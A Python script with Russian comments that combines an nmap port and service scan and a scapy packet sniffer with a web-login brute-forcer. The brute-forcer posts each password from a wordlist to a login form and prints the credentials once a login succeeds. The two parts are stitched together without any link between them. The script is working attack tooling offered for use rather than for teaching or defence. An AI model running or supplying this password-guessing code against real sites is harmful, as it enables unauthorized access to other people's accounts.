import nmap
from scapy.all import *
import requests

captured_packets = []

def packet_handler(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        captured_packets.append((src_ip, dst_ip))
        # Выводим полный пакет
        print("Содержимое пакета:")
        print(packet.show(dump=True))

        # Анализ протоколов
        payload = packet.payload
        while payload:
            payload_class = payload.guess_payload_class(packet.payload)
            if payload_class is None:
                break
            print("Протокол:", payload_class.__name__)
            payload = payload.payload

def start_traffic_analysis(interface):
    sniff(iface=interface, prn=packet_handler, filter="ip", count=10)

def scan_network_and_start_analysis(target):
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-p 1-1000 -sV')

    for host in scanner.all_hosts():
        if scanner[host].state() == 'up':
            print(f"Host: {host}")
            for protocol in scanner[host].all_protocols():
                print(f"Protocol: {protocol}")
                ports = scanner[host][protocol].keys()
                for port in ports:
                    service = scanner[host][protocol][port]
                    print(f"Port: {port}\tState: {service['state']}\tService: {service['name']}")

    start_traffic_analysis(interface)

# Запрашиваем IP-адрес у пользователя
ip_address = input("Введите IP-адрес для сканирования и анализа трафика: ")
# Запрашиваем имя сетевого интерфейса у пользователя
interface = input("Введите имя сетевого интерфейса для анализа трафика (по умолчанию eth0): ") or "eth0"

# Выполняем сканирование сети и анализ трафика
scan_network_and_start_analysis(ip_address)

# Выводим результаты захвата
print("\n=== Статистика и отчетность ===")
print(f"Анализ IP-адреса: {ip_address}")
print(f"Анализ сетевого интерфейса: {interface}")
print(f"Количество захваченных пакетов: {len(captured_packets)}")
print("Список захваченных пакетов:")
for i, packet in enumerate(captured_packets):
    print(f"Пакет {i+1}: Source IP: {packet[0]} --> Destination IP: {packet[1]}")

url = input('Enter URL: ')
username = input('Enter Username: ')
password_file = input('Enter Passwords File: ')
login_failed_string = input('Enter Error message: ')

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print('Trying: ' + password)
        data = {'user': username, 'pass': password, 'Login': 'submit'}
        response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print('Found Username: ==> ' + username)
            print('Found Password: ==> ' + password)
            exit()

with open(password_file, 'r') as passwords:
    cracking(username, url)

print('Password is not in the list')
